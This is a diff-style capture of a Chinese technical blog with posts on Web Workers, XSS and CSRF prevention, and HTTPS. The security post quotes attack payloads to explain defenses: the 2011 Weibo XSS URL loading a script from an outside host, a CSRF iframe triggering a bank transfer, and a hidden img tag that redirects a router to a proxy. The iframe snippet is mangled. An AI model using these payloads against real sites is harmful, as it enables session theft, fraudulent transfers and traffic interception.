+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// object-assign-everywhere.js</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="built_in">Object</span>.assign(&#123;&#125;, &#123;<span class="attr">x</span>:<span class="number">1</span>, <span class="attr">y</span>:<span class="number">2</span>, <span class="attr">z</span>:<span class="number">3</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = <span class="built_in">Object</span>.assign(&#123;&#125;, a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"a is"</span>, a);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"b is"</span>, b);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"a and b have same map:"</span>, %HaveSameMap(a, b));</span><br></pre></td></tr></table></figure>
+<p>也就是说，关于代码多态化的问题还未停歇。保持单态性，对你的大多数代码来说，或许根本不重要。在无所谓的优化之前，你应当细心衡量对比。</p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://www.xqyoung.com/2018/11/20/translation-react-polymorphism/" data-id="ckbs697qk002xrhjc7xt0zeni" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/React/">React</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/js底层/">js底层</a></li></ul>
+
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-web-worker" class="article article-type-post" itemscope="" itemprop="blogPost" data-scroll-reveal="">
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2018/11/20/web-worker/">【转载】浅谈 Web Worker</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2018/11/20/web-worker/" class="article-date">
+  <time datetime="2018-11-20T15:12:03.000Z" itemprop="datePublished">2018-11-20</time>
+</a>
+                            
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/浏览器/">浏览器</a>
+  </div>
+
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <blockquote>
+<p>转载自<a href="https://juejin.im/post/59c1b3645188250ea1502e46" target="_blank" rel="noopener">浅谈HTML5 Web Worker</a>，略有修改</p>
+<p>参考<a href="https://www.html5rocks.com/zh/tutorials/workers/basics/" target="_blank" rel="noopener">Web Workers 的基本信息 HTML5 Rocks</a></p>
+</blockquote>
+<h2 id="浅谈-Web-Worker"><a href="#浅谈-Web-Worker" class="headerlink" title="浅谈 Web Worker"></a>浅谈 Web Worker</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Workers_API" target="_blank" rel="noopener">Web Worker</a> 使得一个 Web 应用程序可以在与主执行线程分离的后台线程中运行一个脚本操作。这样做的好处是可以在一个单独的线程中执行费时的处理任务，从而允许主（通常是UI）线程运行而不被阻塞/放慢。</p>
+<p><a href="https://html.spec.whatwg.org/multipage/workers.html#workers" target="_blank" rel="noopener">规范</a>中介绍了两种 Worker ：专用 Worker 和 共用 Worker。本文只涉及专用 Worker，并在全文中将其称为“Web Worker”或“Worker”。</p>
+<h3 id="创建-worker"><a href="#创建-worker" class="headerlink" title="创建 worker"></a>创建 worker</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myWorker = <span class="keyword">new</span> Worker(<span class="string">'task.js'</span>);</span><br><span class="line"></span><br><span class="line">myWorker.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'in main:'</span>, e.data)</span><br><span class="line">&#125;</span><br><span class="line">myWorker.postMessage(&#123;</span><br><span class="line">    msg: <span class="string">'from main'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>脚本 task.js 在 worker 线程运行。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params">wait</span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'in worker:'</span>, i);</span><br><span class="line">        postMessage(i);</span><br><span class="line">    &#125;, wait);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">timer(<span class="number">4000</span>);</span><br><span class="line"></span><br><span class="line">onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e.data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在 task.js 中，global 是一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/DedicatedWorkerGlobalScope" target="_blank" rel="noopener">DedicatedWorkerGlobalScope</a> 对象，setTimeout 时和最外部的 this 指向这个对象，所以这里没有指定调用 possMessage ，onmessage 的对象（其实就是 this.postMessage）。</p>
+<p>创建 Worker 总需要新建一个脚本吗？不一定，可以用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/URL/createObjectURL" target="_blank" rel="noopener">URL.createObjectURL()</a> 创建 URL 对象，实现内嵌 Worker</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> myTask = <span class="string">`</span></span><br><span class="line"><span class="string">    var i = 0;</span></span><br><span class="line"><span class="string">    function timedCount()&#123;</span></span><br><span class="line"><span class="string">        i = i+1;</span></span><br><span class="line"><span class="string">        postMessage(i);</span></span><br><span class="line"><span class="string">        setTimeout(timedCount, 1000);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    timedCount();</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([myTask]);</span><br><span class="line"><span class="keyword">var</span> myWorker = <span class="keyword">new</span> Worker(<span class="built_in">window</span>.URL.createObjectURL(blob));</span><br></pre></td></tr></table></figure>
+<h3 id="Worker-通信"><a href="#Worker-通信" class="headerlink" title="Worker 通信"></a>Worker 通信</h3><p>主页面与 Worker 之间的通信是通过 postMessage() 方法和 onmessage 事件。通信可以由任一方发起，另一方接收。</p>
+<h4 id="简单数据传递"><a href="#简单数据传递" class="headerlink" title="简单数据传递"></a>简单数据传递</h4><p>在主页面与 Worker 之间传递的数据是通过拷贝，而不是共享来完成的。传递给 Worker 的对象需要经过序列化，接下来在另一端还需要反序列化。页面与 Worker 不会共享同一个实例，最终的结果就是在每次通信结束时生成了数据的一个副本。</p>
+<p>也就是说，<strong>Worker 与其主页面之间只能单纯的传递数据，不能传递复杂的引用类型</strong>：如通过构造函数创建的对象等。并且，传递的数据也是经过拷贝生成的一个副本，在一端对数据进行修改不会影响另一端。</p>
+<h4 id="通过可转让对象传递数据"><a href="#通过可转让对象传递数据" class="headerlink" title="通过可转让对象传递数据"></a>通过可转让对象传递数据</h4><p>前面介绍了简单数据的传递，其实还有一种性能更高的方法来传递数据，就是通过可转让对象将数据在主页面和Worker之间进行来回穿梭。可转让对象从一个上下文转移到另一个上下文而不会经过任何拷贝操作。这意味着当传递大数据时会获得极大的性能提升。和按照引用传递不同，一旦对象转让，那么它在原来上下文的那个版本将不复存在。该对象的所有权被转让到新的上下文内。例如，当你将一个 ArrayBuffer 对象从主应用转让到 Worker 中，原始的 ArrayBuffer 被清除并且无法使用。它包含的内容会(完整无差的)传递给 Worker 上下文。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> uInt8Array = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">32</span>); <span class="comment">// 32MB</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; uInt8Array .length; ++i) &#123;</span><br><span class="line">  uInt8Array[i] = i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(uInt8Array.length); <span class="comment">// 传递前长度:33554432</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> myTask = <span class="string">`</span></span><br><span class="line"><span class="string">    onmessage = function (e) &#123;</span></span><br><span class="line"><span class="string">        var data = e.data;</span></span><br><span class="line"><span class="string">        console.log('worker:', data); // ArrayBuffer(33554432)</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([myTask]);</span><br><span class="line"><span class="keyword">var</span> myWorker = <span class="keyword">new</span> Worker(<span class="built_in">window</span>.URL.createObjectURL(blob));</span><br><span class="line">myWorker.postMessage(uInt8Array.buffer, [uInt8Array.buffer]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(uInt8Array.length); <span class="comment">// 传递后长度:0</span></span><br></pre></td></tr></table></figure>
+<h3 id="importScripts"><a href="#importScripts" class="headerlink" title="importScripts()"></a>importScripts()</h3><p>Worker 线程能够访问一个全局函数 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WorkerGlobalScope/importScripts" target="_blank" rel="noopener">improtScripts()</a> 来引入脚本，该函数接受 0 个或者多个 URI 作为参数。</p>
+<p>此示例将 script1.js 和 script2.js 加载到了 Worker 中：</p>
+<p>worker.js：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">importScripts(<span class="string">'script1.js'</span>);</span><br><span class="line">importScripts(<span class="string">'script2.js'</span>);</span><br><span class="line"><span class="comment">// 可以访问 script1.js script2.js 中的全局变量</span></span><br></pre></td></tr></table></figure>
+<p>也可以写成单个导入语句：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">importScripts(<span class="string">'script1.js'</span>, <span class="string">'script2.js'</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="适用于-Worker-的功能"><a href="#适用于-Worker-的功能" class="headerlink" title="适用于 Worker 的功能"></a>适用于 Worker 的功能</h3><p>由于 Web Worker 的多线程行为，所以它们只能使用 JavaScript 功能的子集：</p>
+<ul>
+<li>navigator 对象</li>
+<li>location 对象（只读）</li>
+<li>XMLHttpRequest</li>
+<li>setTimeout()/clearTimeout() 和 setInterval()/clearInterval()</li>
+<li>应用缓存</li>
+<li>使用 importScripts() 方法导入外部脚本</li>
+<li>生成其他 Web Worker</li>
+</ul>
+<p>Worker 无法使用：</p>
+<ul>
+<li>DOM（非线程安全）</li>
+<li>window 对象</li>
+<li>document 对象</li>
+<li>parent 对象</li>
+</ul>
+<h3 id="终止-terminate"><a href="#终止-terminate" class="headerlink" title="终止 terminate()"></a>终止 terminate()</h3><p>在主页面上调用 terminate() 方法，可以立即杀死 worker 线程，不会留下任何机会让它完成自己的操作或清理工作。另外，Worker 也可以调用自己的 close() 方法来关闭自己</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 主页面调用</span></span><br><span class="line">myWorker.terminate();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Worker 线程调用</span></span><br><span class="line">self.close();</span><br></pre></td></tr></table></figure>
+<h3 id="处理错误"><a href="#处理错误" class="headerlink" title="处理错误"></a>处理错误</h3><p>当 worker 出现运行时错误时，它的 onerror 事件处理函数会被调用。它会收到一个实现了 ErrorEvent 接口名为 error 的事件。相关界面中包含用于找出错误内容的三个实用属性：filename - 导致错误的 Worker 脚本的名称；lineno - 出现错误的行号；以及 message - 有关错误的实用说明。</p>
+<p>该事件不会冒泡，并且可以被取消；为了防止触发默认动作，worker 可以调用错误事件的 preventDefault() 方法。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;output id=<span class="string">"error"</span> style=<span class="string">"color: red;"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">output</span>&gt;</span></span></span><br><span class="line">&lt;output id=<span class="string">"result"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">output</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">onError</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'error'</span>).textContent = [</span><br><span class="line">      <span class="string">'ERROR: Line '</span>, e.lineno, <span class="string">' in '</span>, e.filename, <span class="string">': '</span>, e.message].join(<span class="string">''</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">onMsg</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'result'</span>).textContent = e.data;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">'workerWithError.js'</span>);</span><br><span class="line">  worker.addEventListener(<span class="string">'message'</span>, onMsg, <span class="literal">false</span>);</span><br><span class="line">  worker.addEventListener(<span class="string">'error'</span>, onError, <span class="literal">false</span>);</span><br><span class="line">  worker.postMessage(); <span class="comment">// Start worker without a message.</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>示例：workerWithError.js 尝试执行 1/x，其中 x 未定义。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// workerWithError.js：</span></span><br><span class="line">self.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  postMessage(<span class="number">1</span>/x); <span class="comment">// Intentional error.</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<h3 id="Worker-使用场景"><a href="#Worker-使用场景" class="headerlink" title="Worker 使用场景"></a>Worker 使用场景</h3><ul>
+<li>预先抓取和/或缓存数据以便稍后使用</li>
+<li>突出显示代码语法或其他实时文本格式</li>
+<li>拼写检查程序</li>
+<li>分析视频或音频数据</li>
+<li>背景 I/O 或网络服务轮询</li>
+<li>处理较大数组或超大 JSON 响应</li>
+<li><code>&lt;canvas&gt;</code> 中的图片过滤</li>
+<li>更新本地网络数据库中的多行内容</li>
+</ul>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>MDN 几个例子</p>
+<p><a href="https://github.com/mdn/simple-web-worker" target="_blank" rel="noopener">基本的dedicated worker示例</a></p>
+<p><a href="https://github.com/mdn/simple-shared-worker" target="_blank" rel="noopener">基本的 shared worker示例</a></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://www.xqyoung.com/2018/11/20/web-worker/" data-id="ckbs697qf002trhjcmmg23lx8" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/js/">js</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/浏览器/">浏览器</a></li></ul>
+
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-xss-and-csrf" class="article article-type-post" itemscope="" itemprop="blogPost" data-scroll-reveal="">
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2018/11/20/xss-and-csrf/">xss 和 csrf 防范</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2018/11/20/xss-and-csrf/" class="article-date">
+  <time datetime="2018-11-20T15:08:36.000Z" itemprop="datePublished">2018-11-20</time>
+</a>
+                            
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/网络/">网络</a>
+  </div>
+
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <h3 id="XSS-and-CSRF"><a href="#XSS-and-CSRF" class="headerlink" title="XSS and CSRF"></a>XSS and CSRF</h3><p>来自维基百科：</p>
+<ul>
+<li><strong>CSS</strong> </li>
+</ul>
+<p>跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</p>
+<p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
+<ul>
+<li><strong>CSRF</strong></li>
+</ul>
+<p>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。[1] 跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p>
+<h4 id="XSS-攻击方法及防范"><a href="#XSS-攻击方法及防范" class="headerlink" title="XSS 攻击方法及防范"></a>XSS 攻击方法及防范</h4><p>XSS 大致可以分为两类：反射型 XSS 和储存型 XSS 。</p>
+<ul>
+<li>反射型 XSS</li>
+</ul>
+<p>被动的非持久性XSS。诱骗用户点击URL带攻击代码的链接，服务器解析后响应，在返回的响应内容中隐藏和嵌入攻击者的XSS代码，被浏览器执行，从而攻击用户。<br>URL可能被用户怀疑，但是可以通过短网址服务将之缩短，从而隐藏自己。</p>
+<ul>
+<li>储存型 XSS</li>
+</ul>
+<p>主动提交恶意数据到服务器，攻击者在数据中嵌入代码，这样当其他用户请求后，服务器从数据库中查询数据并发给用户，用户浏览此类页面时就可能受到攻击。典型的例子是留言板。</p>
+<p>还有 DOM-based XSS（基于 DOM 的 XSS），一般是攻击者通过代码注入（输入框，留言板）执行恶意代码，盗取 cookie ，获取敏感信息，进一步发起 CSRF 。</p>
+<p>防范：</p>
+<ul>
+<li>用户输入过滤。对用户提交的数据进行有效性验证，仅接受指定长度范围内并符合我们期望格式的的内容提交，阻止或者忽略除此外的其他任何数据</li>
+<li>用户输出转义，当需要将一个字符串输出到Web网页时，同时又不确定这个字符串中是否包括XSS特殊字符，为了确保输出内容的完整性和正确性，输出HTML属性时可以使用HTML转义编码（HTMLEncode）进行处理，输出到 <code>&lt;script&gt;</code> 中，可以进行JS编码。现在主流框架 Vue，React，或者衍生的 UI 框架，其实都有对输入输出做 XSS 防范。</li>
+<li>将重要的cookie标记为httponly，这样的话当浏览器向Web服务器发起请求的时就会带上cookie字段，但是在js脚本中却不能访问这个cookie，这样就避免了XSS攻击利用JavaScript的document.cookie获取cookie。【这种方法其实不是避免 XSS ，只是减小了可能的危害】</li>
+</ul>
+<p><a href="https://coolshell.cn/articles/4914.html" target="_blank" rel="noopener">2011年新浪微博的 XSS 攻击</a>是储存型 XSS 。其利用了微博广场页面 <a href="http://weibo.com/pub/star" target="_blank" rel="noopener">http://weibo.com/pub/star</a> 的一个URL注入了js脚本，其通过 <a href="http://163.fm/PxZHoxn" target="_blank" rel="noopener">http://163.fm/PxZHoxn</a> 短链接服务，将链接指向：</p>
+<p><a href="http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update" target="_blank" rel="noopener">http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update</a></p>
+<p>注意，上面URL链接中的其实就是 <code>&lt;script src=//www.2kt.cn/images/t.js&gt;&lt;/script&gt;</code>。</p>
+<p>点击这个链接的用户会自动发一条类似“郭美美事件的一些未注意到的细节 <a href="https://t.cn/amsDE”" target="_blank" rel="noopener">https://t.cn/amsDE”</a> 的微博（博文中的链接是一个新的 evil url，一旦其他用户点击，就会把类似链接传递下去）。</p>
+<h4 id="CSRF-攻击方法和防范"><a href="#CSRF-攻击方法和防范" class="headerlink" title="CSRF 攻击方法和防范"></a>CSRF 攻击方法和防范</h4><p>以下内容译自 <a href="http://www.veracode.com/security/csrf" target="_blank" rel="noopener">CROSS-SITE REQUEST FORGERY GUIDE: LEARN ALL ABOUT CSRF ATTACKS AND CSRF PROTECTION</a></p>
+<p>CSRF：恶意网站向一个 Web app 发出请求，而用户已经在别的站点认证了这个 Web 程序。用这种方法，攻击者可以通过用户信任的浏览器，访问目标 web app 的功能。被攻击的目标包括 Web app，比如社交媒体，浏览器邮件客户端，网银和网络设备的 Web 界面。</p>
+<hr>
+<h5 id="CSRF-的关键概念"><a href="#CSRF-的关键概念" class="headerlink" title="CSRF 的关键概念"></a>CSRF 的关键概念</h5><ul>
+<li>恶意请求从用户访问的站点发送到攻击者觉得经过受害者认证的其他站点。</li>
+<li>通过目标站点身份验证的恶意请求，经受害者的浏览器被发送到目标站点。</li>
+<li>漏洞存在于受影响的 Web app 中，而不是受害者的浏览器或托管CSRF的站点。</li>
+</ul>
+<hr>
+<h5 id="执行一次-CSRF-攻击"><a href="#执行一次-CSRF-攻击" class="headerlink" title="执行一次 CSRF 攻击"></a>执行一次 CSRF 攻击</h5><p>CSRF 中，攻击者利用了目标 Web app 的身份认证机制。一次 CSRF 中，受害者必须通过目标站点的身份认证（登陆）。举个例子，网银 <code>examplebank.com</code> 有 CSRF 漏洞，如果我浏览这个站点上藏有 CSRF 隐患的页面，但是我没有登录，那么无事发生。假如我登录了，攻击中的请求将被执行，看起来就好像是我做的一样。（浏览器无法辨别用户是否主动请求）。</p>
+<p>接下来讲一下，上面的攻击的细节。首先假设我在 <code>examplebank.com</code> 登陆了我的帐号，所以我可以做一些网上银行操作，包括转账。</p>
+<p>现在我碰巧访问了 <code>somemalicioussite.com</code> ，这个站点攻击 <code>examplebank.com</code> 的用户，并且在本站设置了一个 CSRF 攻击，中招的用户会向帐号 123456789 转帐 $1,500.00 。在 <code>somemalicioussite.com</code> 的某个地方，攻击者加了这样一行代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"//www.veracode.com/%3Ca%20href%3D"</span>http:<span class="comment">//examplebank.com/app/transferFunds?amount=1500&amp;destinationAccount=123456789"&gt;http://examplebank.com/app/transferFunds?amount=1500&amp;destinationAccount=..." &gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过加载这个 iframe ，我的浏览器会向 <code>examplebank.com</code> 发送一条转账请求，因为我已经在 <code>examplebank.com</code> 登陆了，所以请求将被执行，$1,500.00 转给了帐号 123456789 。</p>
+<hr>
+<h5 id="另一个-CSRF-例子"><a href="#另一个-CSRF-例子" class="headerlink" title="另一个 CSRF 例子"></a>另一个 CSRF 例子</h5><p>我买了一个新的家居无线路由器。同诸多 wifi 路由器，它通过一个 web 界面设置参数。我收到路由器的时候，它有一个内置 IP 地址 192.168.1.1 。我正不知如何设置路由器，刚好 <code>somemalicioussite.com</code> 上面有一个帖子有相关教程。攻击者在这个教程里面为我的路由器添加了一个代理，指向服务 123.45.67.89 ，以后通过路由器的流量都会经过这个代理，包括密码，sessionId。</p>
+<p>当我点击这个教程的时候，我忽略了一张加载失败的 1px 的小图：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=”http:<span class="comment">//192.168.1.1/admin/config/outsideInterface?nexthop=123.45.67.89” alt=”pwned” height=”1” width=”1”/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>攻击者知道我正在读他们的教程，我会登陆路由器设置界面，所以他们把 CSRF 攻击藏在教程里面。有了上面的设置，我的路由会被添加一个代理服务器，所有经过路由器的流量也会经过这个代理服务器，攻击者就可以搞坏事了。</p>
+<hr>
+<h5 id="预防-CSRF"><a href="#预防-CSRF" class="headerlink" title="预防 CSRF"></a>预防 CSRF</h5><ul>
+<li>修改请求不要使用 GET ，暴露参数</li>
+<li>img/script 标签可以跨域，能带上cookie，并且还支持除GET之外的其它方式。所以这种方式也是能实现CSRF的</li>
+</ul>
+<p>方法一是每次请求都要在参数里面显示地带上token即登陆的票，虽然跨域请求能带上cookie，但是通过document.cookie仍然是获取不到其它源的cookie的，所以攻击者无法在代码里面拿到cookie里面的token，所以就没办法了。方法一的缺点是会暴露token，所以需要带token的最好不能是GET，因为GET会把参数拼在url里面，用户可能会无意把链接发给别人，但不知道这个链接带上了自己的登陆信息。</p>
+<p>方法二是每次转账请求前都先请求一个随机串，这个串只能用一次转账或者支付请求，用完就废弃，只有这个串对得上才能请求成功，攻击者是无法拿到这个串的，因为如果跨域请求带cookie，浏览器要求Access-Control-Allow-Origin不能为通配符，只能为指定的源。</p>
+<blockquote>
+<p>参考文章</p>
+</blockquote>
+<blockquote>
+<p><a href="https://www.imooc.com/article/13553" target="_blank" rel="noopener">对于跨站脚本攻击（XSS攻击）的理解和总结</a></p>
+<p><a href="https://www.zhihu.com/question/21289758" target="_blank" rel="noopener">存储型XSS与反射型XSS有什么区别？</a></p>
+<p><a href="https://coolshell.cn/articles/4914.html" target="_blank" rel="noopener">新浪微博的XSS攻击</a></p>
+<p><a href="http://www.veracode.com/security/csrf" target="_blank" rel="noopener">CROSS-SITE REQUEST FORGERY GUIDE: LEARN ALL ABOUT CSRF ATTACKS AND CSRF PROTECTION</a></p>
+<p><a href="https://fed.renren.com/2018/01/20/cross-origin/" target="_blank" rel="noopener">我知道的跨域与安全</a></p>
+</blockquote>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://www.xqyoung.com/2018/11/20/xss-and-csrf/" data-id="ckbs697qg002vrhjcmpxujdio" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全/">安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络/">网络</a></li></ul>
+
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-http-and-https" class="article article-type-post" itemscope="" itemprop="blogPost" data-scroll-reveal="">
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2018/11/20/http-and-https/">抓包详解 HTTPS 过程</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2018/11/20/http-and-https/" class="article-date">
+  <time datetime="2018-11-20T15:05:42.000Z" itemprop="datePublished">2018-11-20</time>
+</a>
+                            
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/网络/">网络</a>
+  </div>
+
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <h2 id="HTTPS-原理"><a href="#HTTPS-原理" class="headerlink" title="HTTPS 原理"></a>HTTPS 原理</h2><p>HTTPS = HTTP + S ，S 是 SSL 或 TLS 。</p>
